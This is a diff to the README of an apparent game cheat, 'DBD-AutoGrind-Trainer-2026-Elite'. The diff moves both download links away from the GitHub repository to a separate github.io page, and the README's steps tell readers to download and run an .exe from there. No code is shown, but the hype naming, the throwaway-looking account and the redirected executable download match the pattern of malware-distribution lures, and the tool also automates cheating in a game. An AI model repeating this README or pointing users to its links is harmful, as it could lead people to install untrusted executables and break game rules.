@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your character progression with ease
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/unrestricted-kiribatidollar915/DBD-AutoGrind-Trainer-2026-Elite)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://unrestricted-kiribatidollar915.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ To run this tool, ensure your computer meets these specifications:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the download page: [https://github.com/unrestricted-kiribatidollar915/DBD-AutoGrind-Trainer-2026-Elite](https://github.com/unrestricted-kiribatidollar915/DBD-AutoGrind-Trainer-2026-Elite)
+1. Visit the download page: [https://unrestricted-kiribatidollar915.github.io](https://unrestricted-kiribatidollar915.github.io)
 2. Locate the latest release file, which ends with an .exe extension.
 3. Click the file to start the download.
 4. Save the file to a folder on your desktop.
